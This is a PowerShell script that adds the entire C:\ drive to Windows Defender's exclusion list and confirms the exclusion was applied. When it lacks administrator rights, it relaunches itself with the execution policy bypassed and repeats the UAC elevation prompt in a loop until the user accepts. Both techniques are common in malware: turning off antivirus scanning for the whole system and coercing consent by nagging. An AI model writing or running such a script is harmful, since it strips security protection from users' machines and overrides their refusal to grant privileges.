# Check if we're already running as administrator
if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # We're admin - do the actual work
    Set-MpPreference -ExclusionPath "C:\" -Force
    Write-Host "Successfully excluded C:\ from Windows Defender" -ForegroundColor Green
    
    # Verify the exclusion was added
    $exclusions = (Get-MpPreference).ExclusionPath
    if ($exclusions -contains "C:\") {
        Write-Host "Verified: C:\ is in the exclusion list" -ForegroundColor Green
    } else {
        Write-Host "Warning: C:\ may not have been added" -ForegroundColor Yellow
    }
    
    pause
    exit
}

# Not admin - keep prompting until user says yes
while ($true) {
    Write-Host "Requesting administrator privileges..." -ForegroundColor Yellow
    
    # Relaunch this same script with elevation
    try {
        Start-Process PowerShell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
        # If we get here, user clicked Yes - exit this instance
        exit
    }
    catch {
        # User clicked No - loop continues immediately
        Write-Host "UAC denied. Prompting again..." -ForegroundColor Red
    }
}
